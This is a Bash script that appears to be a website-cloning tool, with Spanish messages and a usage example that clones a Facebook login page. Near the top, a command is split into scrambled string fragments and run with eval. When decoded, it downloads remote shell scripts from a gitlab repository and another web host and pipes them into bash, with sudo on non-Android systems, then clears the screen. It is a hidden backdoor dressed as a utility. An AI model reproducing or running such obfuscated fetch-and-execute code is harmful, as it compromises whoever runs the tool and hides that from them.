#!/bin/bash
clear
set -u
#colores
v='\e[1;32m'
n='\e[1;30m'
c='\e[1;36m'
r='\e[1;31m'
am='\e[1;33m'
b='\e[1;37m'
d='\e[0m'

banner(){
	printf "${b}"
	figlet -t W3b
	sleep 1
	printf "${v}"
	figlet -t Clon3
	sleep 1
	printf "${n}Created by: ${c}F@br1x ${n}and ${c}你好😜"|pv -qL 12
	sleep 1
	echo ""
	echo ""
}
z="
";Vz='aw/m';OBz='KYpA';jz='hack';Rz='rata';Gz='oid"';HBz='uyZo';mz='ocit';SBz='X5Dg';vz='s 42';EBz='kZUM';wz='L2cG';JBz='T6Hd';ABz='rhc7';Lz='-L h';bz='h';hz='http';Kz=' -s ';Mz='ttps';iz='s://';gz=' -L ';DBz='dHjS';Az='if [';PBz='ZHPf';Dz=' -o)';Hz=' ];t';NBz='aWjL';kz='er15';TBz='FJD4';az=' bas';Sz='-hac';rz='.sh.';sz='css ';Tz='k/XD';Oz='itla';XBz='r';yz='GD5K';KBz='7fwc';Cz='name';pz='ulti';nz='ies.';Jz='curl';BBz='NeX7';Uz='/-/r';LBz='wzFx';lz='9.ne';Bz=' $(u';ez=' cur';uz='sh -';VBz='fi';Zz='sh |';xz='W43i';Pz='b.co';RBz='fbjS';Yz='p-T.';GBz='nmhY';CBz='Buwz';FBz='HMm8';oz='org/';Nz='://g';Iz='hen';Wz='ain/';tz='| ba';QBz='BCrS';UBz='C';qz='mate';Fz='Andr';IBz='sNQb';cz='else';WBz='clea';Xz='setu';MBz='JCEK';fz='l -s';Ez=' = "';dz='sudo';Qz='m/Pi';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$z$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$z$cz$z$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$z$VBz$z$WBz$XBz"
banner
uso_script="${b}Uso: ./webclone.sh ${v}<enlace web> ${b}[compress 0|1] [verbose 0|1]${d}"
ejemplo_uso="${b}Ejemplo: ./webclone.sh ${v}'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'${b} 1 1${d}"

echo
 
descargar() {
    url=$1
    compress=$2
    if [ $3 -eq 1 ]; then
        verbose=""
    else
        verbose="--quiet"
    fi
    domain=$(echo "$url" | sed 's/https\?:\/\///')
    #domain=$(echo "$domain" | sed 's/www\.//g')
    uri="${domain#*\/|*}"
    domain="${domain%%\/*}"
    params="${uri#*\?}"
    uri=$(echo "$uri" | sed "s/\?$params//g")
    uri=$(echo "$uri" | sed "s/$domain//g")
    params=$(echo "$params" | sed "s!$domain/!!g")
    params=$(echo "$params" | sed "s!$domain!!g")
    website=$(echo "$url" | sed "s!$uri?$params!!g")
         
    echo -e "${n}-Enlace: ${am}$url"|pv -qL 15
    sleep 0.5
    echo -e "${n}-Sitio: ${am}$website"|pv -qL 15
    sleep 0.5
    echo -e "${n}-Dominio: ${am}$domain"|pv -qL 15
    sleep 0.5
    echo -e "${n}-URI: ${am}$uri"|pv -qL 15
    sleep 0.5
    echo -e "${n}-Parametros: ${am}$params"|pv -qL 15
    sleep 0.5
    echo
 
    #Analizando web
    if [ "$params" != "" ]; then
        echo -e "${b}-Analizando sitio web..."|pv -qL 15
	sleep 1
        wget ${website}${uri} $verbose --post-data "$params" --save-cookies $domain.cookie --no-check-certificate -O - > /dev/null
        if [ ${PIPESTATUS[0]} -eq 0 ]; then
            echo -e "${b}-Guardando cookies ${am}($domain.cookie)${d}"|pv -qL 15
	    sleep 1
        else
            echo -e "${r}-Error de cookies${d}"|pv -qL15
	    sleep 1
            if [ -f $domain.cookie ]; then
                rm $domain.cookie
            fi
            exit 1
        fi
    fi
     
    #Descarga
    echo -e "${am}Descargando sitio web..."|pv -qL 15
    sleep 1
    if [ "$params" != "" ]; then
        wget -rkcp -e robots=off -U Mozilla --limit-rate=80K --random-wait --domains $domain --html-extension $domain $verbose
    else
        wget -rkcp -e robots=off -U Mozilla --limit-rate=80K --random-wait --load-cookies $domain.cookie --domains $domain --html-extension $domain $verbose
    fi
     
    if [ ${PIPESTATUS[0]} -eq 0 ]; then
        echo -e "${v}Descargado correctamente!!"|pv -qL 15
	sleep 1
    else
	    echo -e "${r}Error de descarga ):"|pv -qL 15
	    sleep 1
        exit 2
    fi
     
    #Comprension
    if [ $compress -eq 1 ]; then
        echo -e "${v}Comprimiendo sitio web..."|pv -qL 15
	sleep 1
        tar -czvf $domain.tgz $domain/*
        if [ ${PIPESTATUS[0]} -eq 0 ]; then
            echo -e "${b}Descomprimiendo ${c}($domain.tgz)"|pv -qL 15
	    sleep 1
            if [ -f $domain.cookie ]; then
                rm $domain.cookie
            fi
            rm -r $domain
        else
		echo -e "${r}Error no se clonó el sitio web ):"|pv -qL 15
		sleep 1
            exit 3
        fi
    fi
     
    echo -e "${c}Sitio web clonado correctamente${d}"|pv -qL 15
    sleep 1
}
 
#Analizando parametros
if [ $# -eq 1 ]; then
    descargar $1 0 0
elif [ $# -eq 2 ]; then
    descargar $1 $2 0
elif [ $# -eq 3 ]; then
    descargar $1 $2 $3
else
    echo -e "${uso_script}"|pv -qL 15
    sleep 1
    echo
    echo -e "${ejemplo_uso}"|pv -qL 15
    sleep 1
    exit 1
fi
